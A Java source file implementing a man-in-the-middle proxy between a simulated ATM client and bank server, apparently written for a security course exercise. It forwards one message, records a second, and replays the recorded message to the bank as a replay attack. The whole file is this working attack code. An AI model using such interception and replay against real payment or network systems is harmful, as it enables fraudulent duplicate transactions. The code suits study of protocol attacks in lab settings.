import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class MITM11 {

	private static String serverIP = "127.0.0.1";
	private static int serverPort = 3000;
	private static int localport = 4000;
	private static String commandServer = "127.0.0.1";
	private static int commandPort = 5000;

	public static void main(String[] args) throws IOException {

		for (int i = 0; i < args.length; i++) {
			if (args[i].equals("-p")) {
				localport = Integer.parseInt(args[++i]);
			} else if (args[i].equals("-s")) {
				serverIP = args[++i];
			} else if (args[i].equals("-q")) {
				serverPort = Integer.parseInt(args[++i]);
			} else if (args[i].equals("-c")) {
				commandServer = args[++i];
			} else if (args[i].equals("-d")) {
				commandPort = Integer.parseInt(args[++i]);
			}
		}

		@SuppressWarnings("resource")
		ServerSocket serverSocket = new ServerSocket(localport);
		System.out.println("started");
		try {
			// first: new account
			Socket atmSite = serverSocket.accept();
			forwardMessage(atmSite);
			// second: record discord
			atmSite = serverSocket.accept();
			ArrayList<String> msg = forwardMessage(atmSite);
			// third: resend recorded Message
			sendToBank(msg);

			System.exit(0);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private static ArrayList<String> forwardMessage(Socket atmSite) throws IOException {
		ArrayList<String> messages = new ArrayList<String>();
		InputStream isATM = atmSite.getInputStream();
		InputStreamReader isrATM = new InputStreamReader(isATM);
		BufferedReader brATM = new BufferedReader(isrATM);
		
		
		String messageATM = brATM.readLine();
		//System.out.println("first msg " + messageATM);
		messages.add(messageATM);
		
		int c;
		StringBuilder messageATM02 = new StringBuilder(150);
		int i = 0;
		while( (i < Integer.parseInt(messageATM)) && (c = isATM.read()) != -1) {
			  char character = (char) c;
			  //System.out.println(character);
			  messageATM02.append(character);
			  i++;
		}
		messages.add(messageATM02.toString());

		//System.out.println("Start Sending");
		String messageBank = sendToBank(messages);
		//System.out.println("end Sending");

		OutputStream osATM = atmSite.getOutputStream();
		OutputStreamWriter oswATM = new OutputStreamWriter(osATM);
		BufferedWriter bwATM = new BufferedWriter(oswATM);
		bwATM.write(messageBank + "\n"); //+ "\n"
		bwATM.flush();

		brATM.close();
		isrATM.close();
		isATM.close();
		atmSite.close();
		return messages;
	}

	private static String sendToBank(ArrayList<String> msg) throws IOException {
		Socket bankSide = new Socket(serverIP, serverPort);
		OutputStream osBank = bankSide.getOutputStream();
		OutputStreamWriter oswBank = new OutputStreamWriter(osBank);
		BufferedWriter bwBank = new BufferedWriter(oswBank);
		bwBank.write(msg.get(0) + "\n");
		bwBank.flush();
		
		bwBank.write(msg.get(1) + "\n");
		bwBank.flush();

		InputStream isBank = bankSide.getInputStream();
		InputStreamReader isrBank = new InputStreamReader(isBank);
		BufferedReader brBank = new BufferedReader(isrBank);
		
		/*String messagesBytes = brBank.readLine();
		System.out.println("bank first part " + messagesBytes);*/
		String messageBank = readByByte(isBank);
		
		//String messageBank = brBank.readLine();
		
		//System.out.println("message from Bank " + messageBank);
		
		
		brBank.close();
		isrBank.close();
		isBank.close();
		bankSide.close();
		return messageBank;
	}
	
	private static String readByByte(InputStream is) {
		int c;
		StringBuilder msg = new StringBuilder(150);
		int i = 0;
		try {
			while( (i < 200) && (c = is.read()) != -1) {
				  char character = (char) c;
				  //System.out.println(character);
				  msg.append(character);
				  i++;
			}
		} catch (IOException e) {
			//System.out.println("readByByte ended with error");
		}
		return msg.toString();
	}
}
